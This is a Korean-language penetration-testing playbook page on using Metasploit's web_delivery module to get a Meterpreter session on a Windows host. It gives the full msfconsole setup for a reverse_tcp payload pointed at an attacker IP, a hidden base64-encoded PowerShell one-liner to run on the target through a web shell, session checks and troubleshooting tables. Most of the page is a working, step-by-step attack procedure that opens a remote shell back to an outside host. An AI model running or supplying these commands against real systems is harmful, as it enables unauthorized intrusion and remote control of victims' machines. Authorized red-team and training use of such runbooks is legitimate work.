---
tags:
  - 환경/windows
  - 서비스/http
시작조건:
  - Windows 대상 호스트에서 PowerShell 명령 실행 확보
  - 대상 호스트에서 공격 호스트의 HTTP 포트와 reverse handler 포트로 연결 가능
필요권한:
  - 현재 Windows 사용자 권한으로 PowerShell 프로세스 실행 가능
필요조건:
  - 대상 Windows 아키텍처와 일치하는 Meterpreter payload
  - 대상에서 연결 가능한 LHOST SRVHOST LPORT SRVPORT
결과:
  - Windows 대상 호스트의 Meterpreter 세션
---

# Metasploit Web Delivery로 Meterpreter 세션 획득

## 한 줄 판단

Windows 대상 호스트에서 PowerShell 명령을 실행할 수 있고 대상이 공격 호스트의 HTTP 서버와 reverse handler에 연결할 수 있으면 Metasploit `web_delivery`가 생성한 PowerShell 명령을 실행해 Meterpreter 세션을 연다.

## 사용할 때

- Web Shell이나 제한된 Windows 셸에서 PowerShell 한 줄 명령은 실행할 수 있지만 Meterpreter 세션 관리 기능이 필요할 때.
- 파일을 직접 업로드하는 대신 Metasploit이 제공하는 HTTP stage를 메모리에서 불러오려 할 때.
- 대상 아키텍처와 callback 방향을 확인한 상태에서 reverse Meterpreter를 받을 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 현재 명령 실행 | Windows 대상에서 PowerShell 명령 실행 가능 | 기존 셸에서 `$PSVersionTable` 또는 짧은 명령 실행 | PowerShell 사용 가능 여부와 언어 모드 확인 |
| HTTP 경로 | 대상에서 `<ATTACKER_IP>:<SRVPORT>` 연결 가능 | `Test-NetConnection <ATTACKER_IP> -Port <SRVPORT>` | SRVHOST bind 주소·방화벽·피벗 경로 확인 |
| callback 경로 | 대상에서 `<ATTACKER_IP>:<LPORT>` 연결 가능 | listener 상태와 대상 outbound 정책 확인 | LHOST·LPORT와 reverse 방향 재확인 |
| payload | 대상 platform·architecture와 payload 일치 | `sysinfo`, `wmic os get osarchitecture` 등 기존 정보 | x86·x64와 TARGET 번호 확인 |

## 실행

### Linux 공격 호스트에서 Web Delivery 준비

```text
sudo msfconsole -q
msf6 > search web_delivery
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST <ATTACKER_IP>
msf6 exploit(multi/script/web_delivery) > set LPORT <LPORT>
msf6 exploit(multi/script/web_delivery) > set SRVHOST <ATTACKER_IP>
msf6 exploit(multi/script/web_delivery) > set SRVPORT <SRVPORT>
msf6 exploit(multi/script/web_delivery) > set TARGET 2
msf6 exploit(multi/script/web_delivery) > exploit
```

확인할 출력:

- `Started reverse TCP handler on <ATTACKER_IP>:<LPORT>`.
- `Using URL: http://<ATTACKER_IP>:<SRVPORT>/<RANDOM_PATH>`.
- `Run the following command on the target machine:` 뒤에 PowerShell 명령이 출력됨.
- `Exploit completed, but no session was created`는 대상 명령을 아직 실행하지 않은 시점에 나올 수 있다. 이어지는 HTTP 서버·handler 시작 여부를 확인한다.

### Windows 대상 호스트에서 생성 명령 실행

Web Shell이나 현재 Windows 셸에 Metasploit이 출력한 명령을 그대로 입력한다.

```powershell
powershell.exe -nop -w hidden -e <GENERATED_BASE64_COMMAND>
```

Metasploit이 난독화되지 않은 `IEX` 명령을 출력한 경우에도 임의로 다시 작성하지 않고 해당 실행에서 생성된 URL·명령을 사용한다.

### Linux 공격 호스트에서 새 세션 확인

```text
msf6 > sessions -l
msf6 > sessions -i <SESSION_ID>
meterpreter > getuid
meterpreter > sysinfo
```

확인할 출력:

- `Meterpreter session <SESSION_ID> opened`.
- `getuid`와 `sysinfo`가 반복 실행되고 대상 호스트·사용자·아키텍처가 예상과 일치함.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| URL·handler는 시작됐지만 session 없음 | 전달 준비만 완료되고 대상 PowerShell 실행·HTTP stage·callback 중 하나는 미확인 | Web Delivery 대기 상태 | 대상 명령 실행과 HTTP·handler 연결을 순서대로 확인 |
| 대상에서 HTTP 요청은 보이지만 session 없음 | stage 다운로드 뒤 payload 실행 또는 reverse callback 단계 실패 | stage 전달만 확인 | payload architecture, LHOST·LPORT와 방어 제어 확인 |
| `Meterpreter session ... opened`와 `getuid` 성공 | 대상에서 payload와 callback이 모두 동작함 | Meterpreter 세션 | [[Meterpreter 세션 후속 행동]] |
| 세션이 열린 직후 종료됨 | 프로세스 종료·payload 불일치·방어 제어 가능성 | 불안정한 Meterpreter 세션 | [[Meterpreter 프로세스 이동과 세션 안정화]] 전 현재 프로세스와 반복 명령 가능 여부 확인 |

## 확인할 출력과 권한

- HTTP 서버 시작, stage 요청, reverse callback, Meterpreter 세션 개방을 서로 다른 확인 지점으로 기록한다.
- Meterpreter 세션을 얻어도 현재 사용자의 권한만 가진다. `getuid`, `getprivs`와 실제 자원 접근으로 권한을 확인한다.
- `TARGET 2`와 payload는 설치된 Metasploit 버전의 `show targets`, `show payloads` 결과를 기준으로 선택한다.

## 관련 도구

- [[metasploit]]
- [[meterpreter]]
- [[powershell]]

## 관련 상태 라우터

- 시작 상태: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- 성공 상태: [[Meterpreter 세션 후속 행동]]
